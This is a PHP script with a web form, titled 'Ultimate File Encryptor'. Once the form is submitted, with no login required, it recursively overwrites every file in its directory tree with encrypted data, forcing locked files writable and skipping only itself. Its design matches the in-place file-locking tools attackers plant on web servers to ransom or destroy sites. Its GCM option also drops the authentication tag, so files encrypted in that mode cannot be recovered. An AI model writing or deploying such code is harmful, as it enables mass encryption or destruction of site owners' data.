<?php
// ===== ERROR REPORTING =====
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ===== CONFIG =====
$cipherMethods = ['AES-128-CBC', 'AES-256-CBC', 'AES-256-GCM', 'CAMELLIA-256-CBC', 'BF-CBC', 'DES-EDE3-CBC'];
$startDir = realpath(__DIR__);
$selfFile = basename(__FILE__);
$logFile = __DIR__ . '/encryption_log.txt';

// ====== PBKDF2 Key Derivation ======
function deriveKey($password, $salt, $keyLength = 32) {
    return hash_pbkdf2('sha256', $password, $salt, 100000, $keyLength, true);
}

// ===== Encryption / Decryption =====
function encryptFile($file, $password, $method) {
    $ivLen = openssl_cipher_iv_length($method);
    $iv = openssl_random_pseudo_bytes($ivLen);
    $salt = openssl_random_pseudo_bytes(16);
    $key = deriveKey($password, $salt);
    $data = file_get_contents($file);
    $encrypted = openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv);
    if ($encrypted === false) return false;
    $final = base64_encode($salt . $iv . $encrypted);
    file_put_contents($file, $final);
    return true;
}

function decryptFile($file, $password, $method) {
    $raw = base64_decode(file_get_contents($file));
    $salt = substr($raw, 0, 16);
    $ivLen = openssl_cipher_iv_length($method);
    $iv = substr($raw, 16, $ivLen);
    $ciphertext = substr($raw, 16 + $ivLen);
    $key = deriveKey($password, $salt);
    $decrypted = openssl_decrypt($ciphertext, $method, $key, OPENSSL_RAW_DATA, $iv);
    if ($decrypted === false) return false;
    file_put_contents($file, $decrypted);
    return true;
}

// ===== ZIP Creation with Password =====
function createEncryptedZip($sourceDir, $zipPath, $zipPassword) {
    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        return false;
    }

    $sourceDir = realpath($sourceDir);
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($sourceDir),
        RecursiveIteratorIterator::LEAVES_ONLY
    );

    foreach ($files as $file) {
        if (!$file->isDir() && $file->getFilename() !== basename(__FILE__)) {
            $filePath = $file->getRealPath();
            $localPath = substr($filePath, strlen($sourceDir) + 1);
            $zip->addFile($filePath, $localPath);
            $zip->setEncryptionName($localPath, ZipArchive::EM_AES_256, $zipPassword);
        }
    }

    return $zip->close();
}

// ===== File Processor with Chmod + Logging =====
function processDir($dir, $password, $method, $action, $skip = []) {
    global $logFile;
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    $log = "";

    foreach ($rii as $file) {
        if ($file->isDir()) continue;

        $filePath = $file->getPathname();
        $fileName = basename($filePath);
        if (in_array($fileName, $skip)) continue;

        if (!is_writable($filePath)) {
            @chmod($filePath, 0644);
        }

        if (!is_writable($filePath)) {
            $log .= "[SKIPPED] Locked: $filePath\n";
            continue;
        }

        $result = false;
        if ($action === 'encrypt') {
            $result = encryptFile($filePath, $password, $method);
        } elseif ($action === 'decrypt') {
            $result = decryptFile($filePath, $password, $method);
        }

        $status = $result ? "[OK]" : "[FAIL]";
        $log .= "$status $action: $filePath\n";
    }

    file_put_contents($logFile, $log, FILE_APPEND);
}

// ===== FORM HANDLER =====
$result = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['password'] ?? '';
    $method = $_POST['method'] ?? '';
    $action = $_POST['action'] ?? '';
    $zipOption = $_POST['zip'] ?? '';
    $zipPassword = $_POST['zip_password'] ?? '';

    if (!in_array($method, $cipherMethods)) {
        $result = "❌ Invalid encryption method.";
    } elseif (empty($password)) {
        $result = "❌ Password cannot be empty.";
    } else {
        if ($zipOption === 'yes' && $action === 'encrypt') {
            $zipFile = __DIR__ . "/encrypted_files.zip";
            $zipCreated = createEncryptedZip($startDir, $zipFile, $zipPassword ?: $password);
            $result .= $zipCreated ? "✅ Encrypted ZIP created.<br>" : "❌ Failed to create ZIP.<br>";
        }

        processDir($startDir, $password, $method, $action, [$selfFile]);
        $result .= "✅ $action complete. Check 'encryption_log.txt'.";
    }
}
?>

<!-- ===== UI ===== -->
<!DOCTYPE html>
<html>
<head>
    <title>Ultimate File Encryptor</title>
    <style>
        body { font-family: monospace; padding: 30px; background: #111; color: #eee; }
        .box { background: #1a1a1a; padding: 25px; max-width: 600px; margin: auto; border-radius: 8px; box-shadow: 0 0 15px #000; }
        input, select, button { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; font-size: 16px; }
        button { background-color: #00cc66; color: white; cursor: pointer; border: none; }
        button:hover { background-color: #00aa55; }
        .msg { background: #222; padding: 15px; border-left: 5px solid #0f0; margin-top: 10px; color: #0f0; }
        h2 { color: #0ff; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🛡️ Ultimate File Encryptor</h2>
        <form method="POST">
            <label>Password:</label>
            <input type="password" name="password" required>

            <label>Encryption Method:</label>
            <select name="method">
                <?php foreach ($cipherMethods as $algo): ?>
                    <option value="<?= $algo ?>"><?= $algo ?></option>
                <?php endforeach; ?>
            </select>

            <label>Action:</label>
            <select name="action">
                <option value="encrypt">Encrypt Files</option>
                <option value="decrypt">Decrypt Files</option>
            </select>

            <label>🗜️ Zip before encryption?</label>
            <select name="zip">
                <option value="no">No</option>
                <option value="yes">Yes</option>
            </select>

            <label>Zip Password (optional):</label>
            <input type="password" name="zip_password" placeholder="Leave blank to use main password">

            <button type="submit">🔐 RUN</button>
        </form>

        <?php if ($result): ?>
            <div class="msg"><?= $result ?></div>
        <?php endif; ?>
        <p style="font-size: 11px; color: #777;">📄 Logs saved in <code>encryption_log.txt</code></p>
    </div>
</body>
</html>
